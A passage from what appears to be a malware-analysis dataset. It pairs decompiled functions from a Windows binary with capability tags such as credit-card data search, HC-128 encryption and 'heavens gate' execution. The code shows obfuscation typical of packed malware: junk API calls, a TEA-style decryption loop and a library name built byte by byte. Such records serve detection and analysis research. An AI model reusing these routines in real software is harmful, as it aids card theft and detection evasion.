(ram,0x0040faa5)\n// WARNING: Removing unreachable block (ram,0x0040fa82)\n// WARNING: Removing unreachable block (ram,0x0040fc78)\n// WARNING: Removing unreachable block (ram,0x0040f9be)\n// WARNING: Removing unreachable block (ram,0x0040fc82)\n// WARNING: Removing unreachable block (ram,0x0040fcc3)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040f621(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00406767();\n        *puVar2 = 0x16;\n        fcn.00405b12(0, 0, 0, 0, 0);\n        fcn.0040633b(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040f6b4. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40fce9\n    (**0x40fce9)();\n    return;\n}\n",
        "token_count": 1880
    },
    "00405545": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405545(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401224;\n    fcn.00403222();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405b48();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00405757": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405757(uint32_t arg_8h)\n\n{\n    fcn.00405734();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405b48();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00405bf6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bf6(uint32_t arg_8h)\n\n{\n    fcn.00405be6();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405b48();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00403304": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00403304(void)\n\n{\n    *0x7fe1f9 = 0x6c;\n    *0x7fe1f3 = 0x6d;\n    *0x7fe1f2 = 0x69;\n    *0x7fe1f4 = 0x67;\n    *0x7fe1f8 = 100;\n    *0x7fe1fb = 0;\n    *0x7fe1f5 = 0x33;\n    *0x7fe1f1 = 0x73;\n    *0x7fe1fa = 0x6c;\n    *0x7fe1f7 = 0x2e;\n    *0x7fe1f6 = 0x32;\n    *0x7fe1f0 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x7fe1f0);\n    return;\n}\n",
        "token_count": 215
    },
    "0040336e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.0040336e(void)\n\n{\n    uint32_t *unaff_ESI;\n    uint32_t uVar1;\n    uint lpNumberOfEventsRead;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = *unaff_ESI;\n    var_34h = *0x413108;\n    uVar1 = unaff_ESI[1];\n    var_3ch = *0x41310c;\n    var_8h = 0;\n    var_40h = -0x61c88647;\n    fcn.00403364();\n    var_8h = var_8h + 0x23f;\n    var_2ch = *0x413110;\n    var_30h = *0x413114;\n    var_28h = 0x20;\n    do {\n        var_14h = 5;\n        var_4h = var_10h * 0x10 + var_2ch;\n        if (*0x814254 == 0xfa9) {\n            *0x814250 = 0xedeb2e40;\n        }\n        if (*0x814254 == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_InterlockedExchange)(&var_44h, 0);\n            *0x812e2c = 0;\n        }\n        var_24h = var_10h + var_8h;\n        var_ch = var_10h >> 5;\n        *0x81424c = 0xf4ea3dee;\n        fcn.0040336b();\n        var_4h = var_4h ^ var_24h;\n        if (*0x814254 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        var_ch = var_ch ^ var_4h;\n        if (*0x814254 == 0x213) {\n            (*_sym.imp.KERNEL32.dll_ReadConsoleInputW)(0, 0, 0, &lpNumberOfEventsRead);\n        }\n        uVar1 = uVar1 - var_ch;\n        var_1ch = 4;\n        var_24h = var_8h + uVar1;\n        var_ch = (uVar1 >> (var_14h & 0x1f)) + var_3ch;\n        var_4h = uVar1 * 0x10 + var_34h ^ var_24h;\n        var_38h = uVar1;\n        var_18h = var_24h;\n        if (*0x814254 == 0x121) {\n            (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, 0, 0, 0);\n        }\n        *0x7fe224 = 0;\n        var_20h = var_10h - (var_4h ^ var_ch);\n        var_8h = var_8h - var_40h;\n        var_28h = var_28h + -1;\n        var_10h = var_20h;\n    } while (var_28h != 0);\n    unaff_ESI[1] = uVar1;\n    *unaff_ESI = var_20h;\n    return;\n}\n",
        "token_count": 845
    },
    "00403506": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00403506(void)\n\n{\n    uint32_t uVar1;\n    uint lpDestStr;\n    uint lpDCB;\n    uint lpNumberOfCharsRead;\n    \n    for (uVar1 = *0x814254 >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        if (*0x814254 == 0x959) {\n            (*_sym.imp.KERNEL32.dll_BuildCommDCBA)(0, &lpDCB);\n            (*_sym.imp.KERNEL32.dll_ReadConsoleA)(0, 0, 0, &lpNumberOfCharsRead, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0, 0, &lpDestStr, 0);\n            (*_sym.imp.KERNEL32.dll_GetCommState)(0, 0);\n            (*_sym.imp.KERNEL32.dll_IsBadStringPtrW)(0x402d38, 0);\n        }\n        fcn.0040336e();\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00403668": {
        "rules": [
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b",
            "search for credit card data/ac143e9ae29c414184a69c9308e24693"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: lpnFit\n// WARNING: Variable defined which should be unmapped: alpDx\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00403668(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1a1ch;\n    uint var_161ch;\n    uint lpBuffer;\n    uint lpString1;\n    uint lpDateStr;\n    uint lpDCB;\n    uint var_218h;\n    uint lpCommTimeouts;\n    uint var_1fch;\n    uint lpSize;\n    uint var_1e8h;\n    uint lpDate;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint nSize;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpnFit;\n    uint alpDx;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00410db4();\n    fcn.00410a80();\n    if (*0x814254 == 0x66) {\n        (*_sym.imp.KERNEL32.dll_SetLocaleInfoA)(0, 0, 0x402d50);\n        (*_sym.imp.GDI32.dll_GetTextExtentExPointW)\n                  (0, 0, 0, 0, unaff_EBP + -0x1c, unaff_EBP + -0x18, unaff_EBP + -0x1ec);\n        (*_sym.imp.ADVAPI32.dll_ReportEventW)(0, 0, 0, 0, 0, 0, 0, 0, 0);\n        (*_sym.imp.ole32.dll_WriteClassStg)(0, unaff_EBP + -0x1fc);\n        (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, unaff_EBP + -0x61c, 0);\n        (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetTimerQueueTimer)(0, 0, 0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)(0, 0, 0);\n        fcn.00405656();\n        fcn.00405734();\n        fcn.004030e0();\n        fcn.004030f9();\n        fcn.00405bd0(0);\n        fcn.00405bd0(0);\n        fcn.004059c4(0);\n        fcn.0040493d(unaff_EBP + -0x218);\n        *(unaff_EBP + -4) = 0;\n        fcn.00404989(unaff_EBP + -0x1cc);\n        *(unaff_EBP + -0x14) = 0;\n        fcn.004049a2(unaff_EBP + -0x14);\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00404979();\n    }\n    *0x814254 = *0x814254 + 0xb2d3b;\n    fcn.0040359f();\n    fcn.004035b3();\n    uVar4 = 0;\n    if (*0x814254 != 0) {\n        do {\n            (*0x812e30)[uVar4] = *(*0x8143f4 + 0xb2d3b + uVar4);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < *0x814254);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryA;\n    *(unaff_EBP + -0x14) = 0;\n    do {\n        if (*0x814254 + *(unaff_EBP + -0x14) == 0x5e) {\n            *(unaff_EBP + -0x200) = 0;\n            *(unaff_EBP + -0x1fc) = 0;\n            *(unaff_EBP + -0x1f8) = 0;\n            *(unaff_EBP + -500) = 0;\n            *(unaff_EBP + -0x1f0) = 0;\n            (*_sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsW)(0, unaff_EBP + -0x21c, unaff_EBP + -0x200);\n            (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, unaff_EBP + -0x161c, 0);\n            (*_sym.imp.KERNEL32.dll_GetTempPathW)(0, unaff_EBP + -0x221c);\n            *(unaff_EBP + -0x1e4) = 0;\n            *(unaff_EBP + -0x1e2) = 0;\n            *(unaff_EBP + -0x1de) = 0;\n            *(unaff_EBP + -0x1da) = 0;\n            *(unaff_EBP + -0x1d6) = 0;\n            (*_sym.imp.KERNEL32.dll_GetDateFormatA)(0, 0, unaff_EBP + -0x1e4, 0x402d64, unaff_EBP + -0x61c, 0);\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)(unaff_EBP + -0xa1c, 0, 0);\n            (*pcVar2)(unaff_EBP + -0x1a1c, 0);\n        }\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n        pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    } while (*(unaff_EBP + -0x14) < 0x40c893);\n    *(unaff_EBP + -0x14) = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetCommMask)(0, 0);\n        (*pcVar3)();\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        if (*(unaff_EBP + -0x14) < 0x26e7e4) {\n            *(unaff_EBP + -0x180) = 0x4a37dc86;\n            *(unaff_EBP + -0xa0) = 0x8fad4aa;\n            *(unaff_EBP + -0x124) = 0x3cbb0804;\n            *(unaff_EBP + -0x4c) = 0x10064b9f;\n            *(unaff_EBP + -0x74) = 0x22486292;\n            *(unaff_EBP + -0x108) = 0x2494b1ff;\n            *(unaff_EBP + -0xfc) = 0x3f986083;\n            *(unaff_EBP + -0x140) = 0x38161cf7;\n            *(unaff_EBP + -0x40) = 0x6a219cdd;\n            *(unaff_EBP + -0x38) = 0x5cbc3e50;\n            *(unaff_EBP + -0x1c0) = 0x6502761a;\n            *(unaff_EBP + -0x114) = 0x4153002c;\n            *(unaff_EBP + -0x198) = 0x5bc3067;\n            *(unaff_EBP + -0xe0) = 0x2ad08fe9;\n            *(unaff_EBP + -0xf4) = 0x7411c935;\n            *(unaff_EBP + -0xd8) = 0x38d852b2;\n            *(unaff_EBP + -0x30) = 0x4e1b7ba8;\n            *(unaff_EBP + -0x84) = 0x60dc6f8f;\n            *(unaff_EBP + -0x1d0) = 0x19447056;\n            *(unaff_EBP + -0x18) = 0x7954be20;\n            *(unaff_EBP + -0xd0) = 0x6ae73bb6;\n            *(unaff_EBP + -0x28) = 0x449650d2;\n            *(unaff_EBP + -0x1a0) = 0x7c455fd2;\n            *(unaff_EBP + -0x13c) = 0x5be30db0;\n            *(unaff_EBP + -0x174) = 0x38b8977;\n            *(unaff_EBP + -0x100) = 0x200979b;\n            *(unaff_EBP + -0x178) = 0x7c4aa1d3;\n            *(unaff_EBP + -0x138) = 0x64c7fe0f;\n            *(unaff_EBP + -0x11c) = 0x68466a28;\n            *(unaff_EBP + -0x170) = 0x307eaba7;\n            *(unaff_EBP + -0xec) = 0x572fa7a5;\n            *(unaff_EBP + -0x94) = 0x5d1fb74c;\n            *(unaff_EBP + -0x1c) = 0x5fc5e3c;\n            *(unaff_EBP + -0x168) = 0x2144a66c;\n            *(unaff_EBP + -0x3c) = 0x10c053a8;\n            *(unaff_EBP + -0x144) = 0x490592a8;\n            *(unaff_EBP + -0x130) = 0x3ac75864;\n            *(unaff_EBP + -0x1a4) = 0x68716ca7;\n            *(unaff_EBP + -0x1c4) = 0x4ba00a96;\n            *(unaff_EBP + -0x1c8) = 0xc77f4c3;\n            *(unaff_EBP + -0xc4) = 0x52f675c1;\n            *(unaff_EBP + -0x160) = 0x240d250d;\n            *(unaff_EBP + -0x2c) = 0x6a801f70;\n            *(unaff_EBP + -0x15c) = 0x271e885f;\n            *(unaff_EBP + -0x128) = 0x2245726;\n            *(unaff_EBP + -0x1e8) = 0x6d33ef9;\n            *(unaff_EBP + -0xe4) = 0x16c6f560;\n            *(unaff_EBP + -0x134) = 0x1842c352;\n            *(unaff_EBP + -0x6c) = 0x63a73f85;\n            *(unaff_EBP + -0x194) = 0x2eadbf3b;\n            *(unaff_EBP + -0x24) = 0x4a0a6019;\n            *(unaff_EBP + -0x8c) = 0x41510c79;\n            *(unaff_EBP + -0xbc) = 0x67cfba29;\n            *(unaff_EBP + -100) = 0xcc2a85e;\n            *(unaff_EBP + -0x1a8) = 0x5055dc3a;\n            *(unaff_EBP + -0x98) = 0x5d1ba65b;\n            *(unaff_EBP + -0x16c) = 0x7483e354;\n            *(unaff_EBP + -0x184) = 0x503c9342;\n            *(unaff_EBP + -0x90) = 0x4a900927;\n            *(unaff_EBP + -0x88) = 0x47e55b77;\n            *(unaff_EBP + -0x1bc) = 0x20a6e6ce;\n            *(unaff_EBP + -200) = 0x44fc4c34;\n            *(unaff_EBP + -0xdc) = 0x66c38897;\n            *(unaff_EBP + -0x7c) = 0x9dcfd62;\n            *(unaff_EBP + -0x68) = 0x3fdf912b;\n            *(unaff_EBP + -0xf8) = 0x44a924e4;\n            *(unaff_EBP + -300) = 0x195e7a81;\n            *(unaff_EBP + -400) = 0x27e5d3e4;\n            *(unaff_EBP + -0x18c) = 0x65c8d95f;\n            *(unaff_EBP + -0x10c) = 0x27cd3417;\n            *(unaff_EBP + -0xc0) = 0x6c26b30a;\n            *(unaff_EBP + -0xb4) = 0x2d45c1d;\n            *(unaff_EBP + -0x154) = 0x68592c56;\n            *(unaff_EBP + -0x158) = 0x101f0e65;\n            *(unaff_EBP + -0x5c) = 0x622c3fc4;\n            *(unaff_EBP + -0x20) = 0x7faf4b75;\n            *(unaff_EBP + -0x1b0) = 0x34afbfdb;\n            *(unaff_EBP + -0x80) = 0x3d2aa76b;\n            *(unaff_EBP + -0xd4) = 0x16341b17;\n            *(unaff_EBP + -0x1b4) = 0x5f2549cb;\n            *(unaff_EBP + -0x1d4) = 0x7527bccb;\n            *(unaff_EBP + -0x120) = 0x63bcbf2f;\n            *(unaff_EBP + -0x78) = 0x4a99d7f3;\n            *(unaff_EBP + -0x164) = 0x5dcb9a3a;\n            *(unaff_EBP + -0xac) = 0x365b810e;\n            *(unaff_EBP + -0x60) = 0x462c8607;\n            *(unaff_EBP + -0x104) = 0x25b60a83;\n            *(unaff_EBP + -0x17c) = 0x1fcea25d;\n            *(unaff_EBP + -0x1b8) = 0xd834ce2;\n            *(unaff_EBP + -0x34) = 0x1b70862e;\n            *(unaff_EBP + -0xb8) = 0x6732085c;\n            *(unaff_EBP + -0x58) = 0x7b00a12e;\n            *(unaff_EBP + -0x44) = 0x1dd14d26;\n            *(unaff_EBP + -0xf0) = 0x44e24f2b;\n            *(unaff_EBP + -0xa4) = 0x1aceebc2;\n            *(unaff_EBP + -0x118) = 0x1e2fdcf6;\n            *(unaff_EBP + -0x1ac) = 0x7d71a239;\n            *(unaff_EBP + -0x50) = 0x5412dc55;\n            *(unaff_EBP + -0x14c) = 0x41af859d;\n            *(unaff_EBP + -0x48) = 0xa498b28;\n            *(unaff_EBP + -0x54) = 0x5e2d51dd;\n            *(unaff_EBP + -0x9c) = 0x77e00076;\n            *(unaff_EBP + -0x150) = 0x5e5a9d7d;\n            *(unaff_EBP + -0x110) = 0x53613019;\n            *(unaff_EBP + -0x19c) = 0x1f34a4b1;\n            *(unaff_EBP + -0x148) = 0x32c374a0;\n            *(unaff_EBP + -0xb0) = 0x40c381e1;\n            *(unaff_EBP + -0x188) = 0xd345695;\n            *(unaff_EBP + -0xcc) = 0x2fe99d90;\n            *(unaff_EBP + -0xa8) = 0x1485481f;\n            *(unaff_EBP + -0x70) = 0x25c7ab0f;\n            *(unaff_EBP + -0xe8) = 0x29a49e8a;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + 0x48618d29;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + 0x59c15f18;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x6a4f63de;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + 0x598795d7;\n            *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x23d99658;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x5844a51d;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x2cb5360e;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x6a0847d;\n            *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + 0x46709d1d;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x2e63d39b;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + 0x1edf127f;\n            *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x7c4a6ad8;\n            *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x95efc76;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + -0x6db9423e;\n            *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x1cec614c;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x48b379dd;\n            *(unaff_EBP + -0x198) = *(unaff_EBP + -0x198) + 0x45d54c05;\n            *(unaff_EBP + -0x1c0) = *(unaff_EBP + -0x1c0) + 0x56bb6e32;\n            *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x1789bff;\n            *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x21815b4c;\n            *(unaff_EBP + -0x1d0) = *(unaff_EBP + -0x1d0) + -0x2955cc22;\n            *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x4685f034;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x2ed5fc6e;\n            *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + -0x23bd1874;\n            *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x37ebbfd1;\n            *(unaff_EBP + -0xd0) = *(unaff_EBP + -0xd0) + -0xd1ff618;\n            *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x7c97fa7;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x63426a34;\n            *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x330f3e6b;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + -0x1d973084;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x728cfcdb;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x358b81c3;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + 0x3b2f08f1;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + 0x3a481191;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x1cc9b3;\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x691eb869;\n            *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + 0x7c34e276;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x41cc8aed;\n            *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x477cea27;\n            *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x2eaa38b9;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x3e42707f;\n            *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + -0x5ad1c4b7;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + 0x64a465c6;\n            *(unaff_EBP + -0x1c0) = *(unaff_EBP + -0x1c0) + 0x44736a6a;\n            *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x300c7346;\n            *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + 0x560e2a14;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x55722bad;\n            *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x6c83fd48;\n            *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0x31f6366d;\n            *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + 0x5d2d5109;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x7cae744b;\n            *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 0x73c0e7a3;\n            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + 0x6fc7d9de;\n            *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + 0x3247c24c;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x16511f5;\n            *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + -0x57b58a98;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x38e8f800;\n            *(unaff_EBP + -0x1a4) = *(unaff_EBP + -0x1a4) + 0xc0eb12d;\n            *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + -0x50fcb6b5;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + -0x113c6f13;\n            *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x8c106b2;\n            *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + 0x4a0ab755;\n            *(unaff_EBP + -0x128) = *(unaff_EBP + -0x128) + 0x4238d1b5;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + -0xf02a383;\n            *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x56c698c1;\n            *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + 0x6d47c928;\n            *(unaff_EBP + -0xd0) = *(unaff_EBP + -0xd0) + -0x6f225a5e;\n            *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x624f68f1;\n            *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + 0x24aeee28;\n            *(unaff_EBP + -0x170) = *(unaff_EBP + -0x170) + -0x673d8072;\n            *(unaff_EBP + -0x128) = *(unaff_EBP + -0x128) + 0x1e80dd99;\n            *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x4331feef;\n            *(unaff_EBP + -0x198) = *(unaff_EBP + -0x198) + 0x30381c21;\n            *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + 0x3185b0ce;\n            *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x35c5e53f;\n            *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + -0x4a9a1aa8;\n            *(unaff_EBP + -0x15c) = *(unaff_EBP + -0x15c) + -0x5d7abd8;\n            *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + -0x49c7351f;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x33998c91;\n            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x1fe526e1;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x1263d7cf;\n            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x4c18c04a;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + 0x317da3a9;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x5fb82b53;\n            *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 0x33522f78;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x6d568a15;\n            *(unaff_EBP + 